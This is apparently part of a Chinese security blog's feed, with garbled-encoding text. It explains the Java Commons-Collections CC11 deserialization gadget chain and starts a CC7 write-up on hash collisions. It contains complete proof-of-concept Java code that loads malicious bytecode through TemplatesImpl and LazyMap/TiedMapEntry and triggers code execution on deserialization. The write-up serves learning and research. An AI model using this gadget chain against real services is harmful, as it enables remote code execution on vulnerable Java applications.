class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-comment">//é€šè¿‡ChainedTransformeråŠ è½½templatesçš„newTransformeræ–¹æ³•</span><br>        <span class="hljs-comment">//CC6</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ¡é“¾æœ€ç»ˆä¹Ÿæ˜¯å¯ä»¥æ”¹å†™æˆä¸å¸¦ Transformer æ•°ç»„çš„é“¾ã€‚</p><h2 id="æœ€ç»ˆæˆå‹çš„CC11"><a href="#æœ€ç»ˆæˆå‹çš„CC11" class="headerlink" title="æœ€ç»ˆæˆå‹çš„CC11"></a>æœ€ç»ˆæˆå‹çš„CC11</h2><p>è¿™ä¸ª <code>LazyMap#get</code> çš„å‚æ•° keyï¼Œä¼šè¢«ä¼ è¿›<code>transform()</code>ï¼Œå®é™…ä¸Šå®ƒå¯ä»¥æ‰®æ¼” ConstantTransformer çš„è§’è‰²â€”â€”ä¸€ä¸ªç®€å•çš„å¯¹è±¡ä¼ é€’è€…ã€‚</p><p>æˆ‘ä»¬ <code>LazyMap.get(key)</code> ç›´æ¥è°ƒç”¨ <code>InvokerTransfomer.transform(key)</code>ï¼Œç„¶ååƒCC2é‚£æ ·è°ƒç”¨ <code>TempalteImpl.newTransformer()</code> æ¥å®Œæˆåç»­è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);  <span class="hljs-comment">//æ³¨æ„è¿™é‡Œæœ‰å‘</span><br><br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br><br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h3><p>å½“æ—¶è¿è¡Œè¿™æ®µä»£ç ï¼Œå¯ä»¥è¿è¡Œï¼Œä¹Ÿæ²¡æŠ¥é”™ï¼Œä½†æ˜¯è®¡ç®—æœºå¹¶ä¸èƒ½å¼¹å‡ºæ¥ï¼Œå¤§ä½“æµè§ˆäº†ä¸€è¾¹ä»£ç æ„Ÿè§‰æ²¡é—®é¢˜ã€‚å½“æ—¶å¡åœ¨è¿™é‡Œå¥½ä¹…ï¼Œåªèƒ½æ…¢æ…¢è°ƒè¯•ã€‚</p><p>ç›´æ¥åœ¨<code>TemplatesImpl</code>åŠ è½½æ¶æ„å­—èŠ‚ç çš„éƒ¨åˆ†å°è¯•<code>templates.newTransformer()</code>ï¼Œé¦–å…ˆç¡®å®šäº†<code>TemplatesImpl</code>åŠ è½½æ¶æ„å­—èŠ‚ç æ˜¯èƒ½å¤Ÿè§¦å‘çš„ï¼Œé‚£è¿™éƒ¨åˆ†æ²¡æœ‰é—®é¢˜</p><p><code>InvokerTransformer</code>è°ƒç”¨çš„éƒ¨åˆ†æˆ‘æƒ³åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œé‚£æœ€æœ‰å¯èƒ½æœ‰é—®é¢˜çš„å…¶å®æ˜¯<code>Lazymap</code>ï¼Œçœ‹äº†æœ€ä¸Šé¢çš„å›¾ï¼Œçœ‹åˆ°æ˜¯è°ƒç”¨äº†LazyMap.get()ï¼Œç›´æ¥ä¸‹æ–­ç‚¹è°ƒè¯•</p><p>å…¶å®å’Œä¹‹å‰CC6çš„æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œå½“LazyMapæ²¡keyçš„æ—¶å€™æ‰ä¼šè°ƒç”¨<code>put()</code>ï¼Œä½†æ˜¯ç°åœ¨çš„keyä¸º<code>templates</code>ï¼Œç»“æœä¸º<code>map.containsKey(key) == true</code>å¯¼è‡´æ¡ä»¶åˆ¤æ–­å¤±è´¥ã€‚</p><p>è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ç›´æ¥<code>lazymap.clear();</code>æˆ–è€…<code>lazymap.remove(&quot;templates&quot;);</code></p><p>(ç²—å¿ƒå¤§æ„å¯¼è‡´æµªè´¹äº†å¾ˆå¤šæ—¶é—´)ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240605205214090.png" alt="image-20240605205214090"></p><h3 id="æœ€ç»ˆé“¾å­"><a href="#æœ€ç»ˆé“¾å­" class="headerlink" title="æœ€ç»ˆé“¾å­"></a>æœ€ç»ˆé“¾å­</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(templates);<br>        <br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br>        <br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/9-CommonsCollections11/CommonsCollections11.md">CommonsCollections11åˆ©ç”¨é“¾åˆ†æ</a></p><p><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#5-%E6%9C%80%E7%BB%88%E4%B8%8D%E5%B8%A6-Transformer-%E6%95%B0%E7%BB%84%E7%9A%84-CC11-%E9%93%BE%E5%AD%90">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡09-CC11é“¾</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC7</title>
    <link href="/2024/06/04/JAVA%E5%AE%89%E5%85%A8/CC7/"/>
    <url>/2024/06/04/JAVA%E5%AE%89%E5%85%A8/CC7/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC7æœ¬è´¨ä¸Šä¹Ÿæ˜¯å¯¹CC1çš„æ”¹å†™ï¼Œèµ°åˆ°äº†ä¸‡æ¶ä¹‹æºLazyMapæœ€ç»ˆå¯¼è‡´ååºåˆ—åŒ–ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/CC7.png" alt="CC7"></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><code>æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)</code>ä¸­å¿ƒæ€æƒ³ï¼š</p><ul><li>ä¸åŒå‚æ•°è¿”å›ä¸åŒå“ˆå¸Œå€¼</li><li>ç›¸åŒå‚æ•°è¿”å›ç›¸åŒå“ˆå¸Œå€¼</li></ul><p>æ¯”å¦‚æˆ‘è¾“å…¥è‘¡è„è¿”å›10ï¼Œè¾“å…¥è¥¿ç“œè¿”å›3ï¼Œä¸‹æ¬¡è¾“å…¥è¥¿ç“œè¿˜æ˜¯è¿”å›3</p><p>(ä¼ å…¥ä¸åŒå‚æ•°æ—¶ï¼Œå“ˆå¸Œå€¼ä¸€å®šéƒ½ä¸ç›¸åŒä¹ˆï¼Ÿäº‹å®ä¸Šä»»ä½•ç®—æ³•åœ¨ç†è®ºä¸Šéƒ½ä¸èƒ½ä¿è¯ã€‚è¿™ç§å‚æ•°ä¸åŒç»“æœç›¸åŒçš„æƒ…å†µå­¦åå«åšâ€œHashå†²çª(Hashç¢°æ’)â€ï¼ŒCC7å°±åˆ©ç”¨äº†è¿™ä¸ªå°æŠ€å·§)</p><p>åœ¨é‡åˆ° hash ç¢°æ’çš„æ—¶å€™, ä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•æ¥å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒæ¥åˆ¤æ–­æ˜¯å¦çœŸçš„æ˜¯ hash ç¢°æ’ã€‚ åœ¨è¿™ä¹‹ä¸­ä½¿ç”¨çš„æ˜¯çˆ¶ç±» <code>AbstractMap</code> çš„ <code>equals()</code> æ–¹æ³•ã€‚</p><p>é‚£<code>æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)</code>æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å“ˆå¸Œå€¼çš„ç‰¹æ€§ï¼Œè®¾è®¡ä¸€å¼ å…¨æ–°çš„è¡¨ç»“æ„â€”-<code>æ•£åˆ—è¡¨(å“ˆå¸Œè¡¨ HashTable)</code></p><p><code>æ•£åˆ—è¡¨ï¼ˆå“ˆå¸Œè¡¨ HashTableï¼‰</code>ï¼Œæ˜¯æ ¹æ®å…³é”®ç å€¼(Key value)è€Œç›´æ¥è¿›è¡Œè®¿é—®çš„æ•°æ®ç»“æ„ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒé€šè¿‡æŠŠå…³é”®ç å€¼,æ˜ å°„åˆ°è¡¨ä¸­ä¸€ä¸ªä½ç½®æ¥è®¿é—®è®°å½•ï¼Œè¿™ä¸ªæ˜ å°„å‡½æ•°å«åš æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)ï¼Œå­˜æ”¾è®°å½•çš„æ•°ç»„å«åšæ•£åˆ—è¡¨ã€‚<br>æ•£åˆ—è¡¨(å“ˆå¸Œè¡¨ HashTable)æ˜¯ç”±æ•°ç»„+é“¾è¡¨å®ç°çš„â€”-æ•£åˆ—è¡¨åº•å±‚ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„ç´¢å¼•ç”±æ•£åˆ—è¡¨çš„ <code>key.hashCode()</code>ç»è¿‡è®¡ç®—å¾—åˆ°ï¼Œ æ•°ç»„çš„å€¼æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œæ‰€æœ‰å“ˆå¸Œç¢°æ’åˆ°ç›¸åŒç´¢å¼•çš„key-valueï¼Œéƒ½ä¼šè¢«é“¾æ¥åˆ°è¿™ä¸ªé“¾è¡¨åé¢ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603225326444.png" alt="image-20240603225326444"></p><h3 id="HashMapç»§æ‰¿å…³ç³»"><a href="#HashMapç»§æ‰¿å…³ç³»" class="headerlink" title="HashMapç»§æ‰¿å…³ç³»"></a>HashMapç»§æ‰¿å…³ç³»</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160518210.png" alt="image-20240603160518210"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤º<code>HashMap</code> æ˜¯<code>AbstractMap</code>çš„å®ç°ç±»ï¼Œ åŒæ—¶è¿™äºŒè€…å®ç°Mapæ¥å£ã€‚</p><p>HashMapä¸­æ²¡æœ‰å®ç°Mapæ¥å£çš„equals()æ–¹æ³•ï¼Œçˆ¶ç±»AbstractMapMapå®ç°äº†equals()æ–¹æ³•</p><h3 id="LazyMapç»§æ‰¿å…³ç³»"><a href="#LazyMapç»§æ‰¿å…³ç³»" class="headerlink" title="LazyMapç»§æ‰¿å…³ç³»"></a>LazyMapç»§æ‰¿å…³ç³»</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160438448.png" 